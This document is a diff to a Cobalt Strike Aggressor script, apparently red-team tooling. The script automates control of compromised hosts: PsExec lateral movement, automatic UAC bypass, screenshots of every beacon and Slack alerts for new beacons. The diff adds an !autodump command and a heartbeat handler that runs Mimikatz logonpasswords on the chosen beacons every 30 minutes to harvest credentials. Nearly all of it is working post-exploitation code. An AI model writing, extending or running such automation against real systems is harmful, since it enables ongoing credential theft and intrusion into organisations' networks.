@@ -7,11 +7,13 @@
 # - PsExec from the event log
 # - Automatically bypass UAC
 # - Screenshot all beacons
-# - Post new beacon notifications to Flowdock
+# - Post new beacon notifications to Slack
+# - Run logonpasswords on specified beacons every 30 minutes
 
-global('$notify');
+global('$notify @autodump');
 
 $notify = 0;
+@autodump = @();
 
 # PsExec against $target from $bid
 # TODO figure out how to use with make_token
@@ -137,6 +139,12 @@ sub notifyBeacon {
     println(readAll(exec(@cmd)));
 }
 
+# Add or remove beacon to autodump
+sub autodump {
+    $bid = $1;
+    add(@autodump, $bid, -1);
+}
+
 # Triggered on all public events in the event log
 on event_public {
     local('@input $cmd @args')
@@ -259,6 +267,16 @@ on event_public {
             say("mimikatz:\t\t\tTask all beacons to run logonpasswords.");
             say("notify:\t\t\tSend notifications to Flowdock for all new Beacons.");
         }
+        else if ($cmd eq "!autodump") {
+            if (!@args) {
+                say("Enter a beacon ID!");
+            }
+            else {
+                foreach $bid (@args) {
+                    autodump($bid);
+                }
+            }
+        }
     }
 }
 
@@ -290,4 +308,11 @@ on beacon_tasked {
     $user = binfo($bid, 'user');
 
     elog($user . "@" . $hostname . " tasked: $2");
+}
+
+# Dump Mimikatz on all beacons in @autodump every 30 minutes
+on heartbeat_30m {
+    foreach $bid (@autodump) {
+        blogonpasswords($bid);
+    }
 }
